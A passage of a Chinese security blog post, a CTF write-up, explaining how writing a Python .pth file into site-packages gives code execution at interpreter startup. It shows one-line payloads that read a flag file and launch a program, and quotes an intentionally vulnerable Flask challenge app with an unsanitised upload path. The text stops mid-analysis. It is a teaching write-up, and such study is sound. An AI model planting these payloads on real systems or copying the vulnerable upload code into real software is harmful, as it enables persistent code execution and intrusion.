@@ -1,0 +1,321 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>【python】pth文件写入getshell | Tranquility</title><meta name="keywords" content="【python】pth文件写入getshell"><meta name="author" content="LIKE"><meta name="copyright" content="LIKE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[python]pth文件写入getshell概述 在讲之前我们先要了解一下python中site模块的作用  site —— 指定域的配置钩子  site模块会在初始化时自动导入,导入此模块将会附加域特定的路径到模块搜索路径并且添加一些内建对象  它会从头部和尾部构建至多四个目录作为起点。 对于头部，它会使用 sys.prefix 和 sys.exec_prefix；空的头部会被跳过。 对于尾部">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【python】pth文件写入getshell">
+<meta property="og:url" content="https://leekoscn.github.io/posts/f85138ce083e/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[python]pth文件写入getshell概述 在讲之前我们先要了解一下python中site模块的作用  site —— 指定域的配置钩子  site模块会在初始化时自动导入,导入此模块将会附加域特定的路径到模块搜索路径并且添加一些内建对象  它会从头部和尾部构建至多四个目录作为起点。 对于头部，它会使用 sys.prefix 和 sys.exec_prefix；空的头部会被跳过。 对于尾部">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leekoscn.github.io/img/hello-world.webp">
+<meta property="article:published_time" content="2023-08-22T10:05:22.439Z">
+<meta property="article:modified_time" content="2023-06-05T06:42:12.531Z">
+<meta property="article:author" content="LIKE">
+<meta property="article:tag" content="【python】pth文件写入getshell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leekoscn.github.io/img/hello-world.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://leekoscn.github.io/posts/f85138ce083e/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: LIKE","link":"链接: ","source":"来源: Tranquility","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【python】pth文件写入getshell',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-06-05 14:42:12'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/cursor.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/hexo-electric-clock@1.0.6/clock.css"><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">215</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">31</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/hello-world.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tranquility</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【python】pth文件写入getshell</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-22T10:05:22.439Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-05T06:42:12.531Z" title="更新于 2023-06-05 14:42:12">2023-06-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【python】pth文件写入getshell"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="python-pth文件写入getshell"><a href="#python-pth文件写入getshell" class="headerlink" title="[python]pth文件写入getshell"></a>[python]pth文件写入getshell</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote>
+<p>在讲之前我们先要了解一下python中<strong>site模块</strong>的作用</p>
+<blockquote>
+<p>site —— 指定域的配置钩子</p>
+</blockquote>
+<p><strong>site模块会在初始化时自动导入</strong>,导入此模块将会<strong>附加域特定的路径到模块搜索路径</strong>并且添加一些内建对象</p>
+<blockquote>
+<p>它会从头部和尾部构建至多四个目录作为起点。 对于头部，它会使用 <code>sys.prefix</code> 和 <code>sys.exec_prefix</code>；空的头部会被跳过。 对于尾部，它会使用空字符串然后是 <code>lib/site-packages</code> (在 Windows 上) 或 <code>lib/python*X.Y*/site-packages</code> (在 Unix 和 macOS 上)。 对于每个不同的头-尾组合，它会<strong>查看其是否指向现有的目录，如果是的话，则将其添加到 <code>sys.path</code> 并且检查新添加目录中的配置文件。</strong></p>
+</blockquote>
+<p>一个路径配置文件是具有 <code>name.pth</code> 命名格式的文件，并且存在上面提到的四个目录之一中；它的内容是要<strong>添加到 <code>sys.path</code> 中的额外项目</strong>（每行一个）。不存在的项目不会添加到 <code>sys.path</code>，并且不会检查项目指向的是目录还是文件。项目不会被添加到 <code>sys.path</code> 超过一次。空行和由 <code>#</code> 起始的行会被跳过。</p>
+<p>每次启动 Python，在 <code>.pth</code> 文件中的可执行行都将会被运行</p>
+<p><strong>以 <code>import</code> 开始的行（跟着空格或 TAB）会被执行。</strong></p>
+</blockquote>
+<p>简单的说：</p>
+<blockquote>
+<p>python 的 site 模块支持 “Site-specific configuration hook” 的功能，这个功能点本身是用来将特定路径加入模块搜索路径。该模块在初始化期间自动导入。<br><code>sys.prefix</code> 和 <code>sys.exec_prefix</code> 在 <code>C:/Python</code>，那么创建路径为 <code>C:\Python\Lib\site-packages\1.pth</code> 的 pth 文件，然后其内容为<br><code>c:/windows/temp/</code><br>那么在新的 python 进程中，temp 路径将被添加到 sys.path 中</p>
+</blockquote>
+<p>当我们在系统python的<code>sys.prefix</code>、<code>sys.exec_prefix</code>路径下的<code>site-packages</code>中写入的1个pth文件的话，每次运行python的时候，会自动将该<strong>文件内容存在的指定路径导入到模块搜索路径</strong>，</p>
+<p>如果pth文件是以<code>import</code>开头的，并且代码是写在一行的话，那么这一行可以被当作python<strong>代码</strong>执行</p>
+<p>这里就可以通过上传文件到sys.prefix中的<code>site-packages</code>下，然后后续启动代码触发命令执行</p>
+<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>我们做个实验：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2023/05/27/qmhoEOtr6W4ig5X.png" alt="image-20230527153444224"></p>
+<p>在kali中我的 <code>pth</code>文件存放在 <code>/usr/local/lib/python3.10/dist-packages</code> 下</p>
+<p>于是我们写一个 1.pth 于该目录。内容为： <code>/tmp</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2023/05/27/TXEhMqbCJn5vzpS.png" alt="image-20230527153630444"></p>
+<p>然后我们使用 <code>sys.path</code>查看：</p>
+<blockquote>
+<p>在 Python 中，<code>sys.path</code>是一个列表，用于指定模块搜索路径。当Python导入模块时，解释器会按照以下顺序搜索模块：</p>
+<ol>
+<li>当前目录。</li>
+<li>环境变量 PYTHONPATH 指定的目录。</li>
+<li>标准库安装路径下的目录。</li>
+</ol>
+<p>在这三个搜索路径中找不到模块时，Python会引发“ModuleNotFoundError”异常。但是，我们可以在运行时修改<code>sys.path</code>，以便在搜索路径中添加自定义目录或修改默认搜索路径。</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2023/05/27/navHm4h6wS5lqGb.png" alt="image-20230527153855985"></p>
+<p>我们发现 <code>/tmp</code> 路径已经被添加进<code>模块搜索路径</code>了，因为每次启动python的会加载site模块，从而加载相关pth文件</p>
+<p>接着我们尝试将<code>pth</code>文件内容改为：(需要写在1行) 去读根目录下的flag文件</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os;os.system(<span class="string">&#x27;cat /fl*&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后我们运行python：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2023/05/27/1nBhxDiZytaP7Vc.png" alt="image-20230527154506803"></p>
+<p>成功命令执行</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在site模块的site.py中有如下代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> n, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f):</span><br><span class="line">    <span class="keyword">if</span> line.startswith(<span class="string">&quot;#&quot;</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> line.strip() == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line.startswith((<span class="string">&quot;import &quot;</span>, <span class="string">&quot;import\t&quot;</span>)):</span><br><span class="line">            <span class="built_in">exec</span>(line)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        line = line.rstrip()</span><br><span class="line">        <span class="built_in">dir</span>, dircase = makepath(sitedir, line)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> dircase <span class="keyword">in</span> known_paths <span class="keyword">and</span> os.path.exists(<span class="built_in">dir</span>):</span><br><span class="line">            sys.path.append(<span class="built_in">dir</span>)</span><br><span class="line">            known_paths.add(dircase)</span><br></pre></td></tr></table></figure>
+
+<p>当<code>pth</code>文件以 <code>import </code>  、<code>import\t </code> 开头时，会将这一行进行命令执行，因此，如果pth内容为：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os;os.system(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>每个新启动的进程都会运行该代码，执行calc命令</p>
+<p>（因为site模块初始化时被加载，并且hook <code>pth</code>文件到<code>模块搜索路径</code>）</p>
+<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><blockquote>
+<p>在Python中，<code>site.addpackage()</code>是一个函数，用于将自定义包添加到Python解释器的系统路径和缓存目录中。</p>
+<p>当我们使用Python解释器执行脚本或启动交互式Shell时，Python解释器会加载默认的模块搜索路径列表。而使用<code>site.addpackage()</code>函数，我们可以为Python解释器添加自定义模块路径，以便让解释器能够找到我们自己创建的包。</p>
+<p><code>site.addpackage()</code>函数的语法如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">site.addpackage(fullpath, set_readable=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>fullpath</code>参数是要添加的包的完整路径，<code>set_readable</code>参数表示是否将该包标记为可读写。</p>
+<p>例如，假设我们创建了名为“my_package”的包，并将其保存在路径<code>/path/to/my_package</code>下。我们可以使用以下代码将“my_package”添加到Python解释器的搜索路径中：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> site</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加my_package到Python解释器的搜索路径中</span></span><br><span class="line">site.addpackage(<span class="string">&#x27;/path/to/my_package&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这样，当我们尝试导入“my_package”模块时，Python解释器将在<code>/path/to/my_package</code>目录下寻找模块，并可以正确地导入我们的自定义包。</p>
+<p>需要注意的是，<code>site.addpackage()</code>只能添加包的路径，而无法加载包中的模块。我们仍然需要使用<code>import</code>来导入包中的模块。</p>
+</blockquote>
+<p>当我们使用 <code>site.addpackage()</code> 函数，并且路径是已知的</p>
+<p><strong>我们可以通过上传pth文件到该路径，进行getshell</strong></p>
+<h4 id="例题：-闽盾杯-pypth"><a href="#例题：-闽盾杯-pypth" class="headerlink" title="例题： [闽盾杯]pypth"></a>例题： [闽盾杯]pypth</h4><p>目录结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|--app.py</span><br><span class="line">|--static</span><br><span class="line">	|--index.html</span><br></pre></td></tr></table></figure>
+
+
+
+<p>app.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> site</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    f = request.files[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;/tmp/storage/<span class="subst">&#123;f.filename&#125;</span>&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> destination:</span><br><span class="line">        destination.write(f.read())</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="string">&quot;File is uploaded!&quot;</span>, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/install&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">install</span>():</span><br><span class="line">    package_name = request.args.get(<span class="string">&#x27;package_name&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> package_name:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;Not allowed!&quot;</span>, <span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    src = os.path.join(<span class="string">&#x27;contrib&#x27;</span>, <span class="string">&#x27;packages&#x27;</span>, package_name)</span><br><span class="line">    dst = os.path.join(<span class="string">&#x27;/tmp/extract&#x27;</span>, package_name)</span><br><span class="line"></span><br><span class="line">    shutil.copy(src, dst)</span><br><span class="line">    shutil.unpack_archive(dst, extract_dir=<span class="string">&#x27;/tmp/extract&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Response(<span class="string">&quot;Installed!&quot;</span>, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    file = os.path.basename(request.args.get(<span class="string">&#x27;file&#x27;</span>))</span><br><span class="line">    file_safe = <span class="string">f&#x27;/tmp/storage/<span class="subst">&#123;file&#125;</span>&#x27;</span></span><br><span class="line">    os.unlink(file_safe)</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="string">&quot;file removed!&quot;</span>, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    site_dir = <span class="string">&quot;/tmp/extract&quot;</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    site.addpackage(site_dir, name, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>index.html</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>File Upload and Package Installation<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>File Upload Form<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/upload&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Upload File<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Package Installation Form<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/install&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;package-name&quot;</span>&gt;</span>Package Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;package_name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;package-name&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Install Package<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Clean up Uploaded Files<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/clean&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>File Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Remove File<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Add Package to Site Directory<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/add&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>Package Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Add Package<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>简单分析一下代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    f = request.files[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;/tmp/storage/<span class="subst">&#123;f.filename&#125;</span>&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> destination:</span><br><span class="line">        destination.write(f.read())</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="string">&quot;File is uploaded!&quot;</span>, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    site_dir = <span class="string">&quot;/tmp/extract&quot;</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    site.addpackage(site_dir, name, <span 